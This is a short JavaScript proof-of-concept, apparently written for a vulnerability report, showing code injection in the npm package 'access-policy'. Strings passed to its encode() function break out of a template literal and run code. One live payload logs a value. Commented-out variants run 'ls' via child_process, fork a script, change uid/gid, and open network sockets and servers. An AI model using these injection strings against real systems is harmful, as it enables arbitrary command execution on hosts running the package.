var a = require("access-policy");
var statements = '`;console.log(123);//';
data = {};
a.encode(statements, data)

// var a = require("access-policy");
// var statements = '`;require(`child_process`).exec(`ls ./`);//';
// data = {};
// a.encode(statements, data)

// var a = require("access-policy");
// var statements = '`;require(`child_process`).fork(`test1.js`);//';
// data = {};
// a.encode(statements, data)

// var a = require("access-policy");
// var statements = '`;process.setgid(123);//';
// data = {};
// a.encode(statements, data)

// var a = require("access-policy");
// var statements = '`;process.setuid(123);//';
// data = {};
// a.encode(statements, data)

// var a = require("access-policy");
// var statements = '`;require(`net`).connect({port: 8080}, function() {});//';
// data = {};
// a.encode(statements, data)

// var a = require("access-policy");
// var statements = '`;require(`dgram`).createSocket({ type: `udp4` }).bind(8080);//';
// data = {};
// a.encode(statements, data)

// var a = require("access-policy");
// var statements = '`;require(`http`).createServer(function(){}).listen(8080);//';
// data = {};
// a.encode(statements, data)
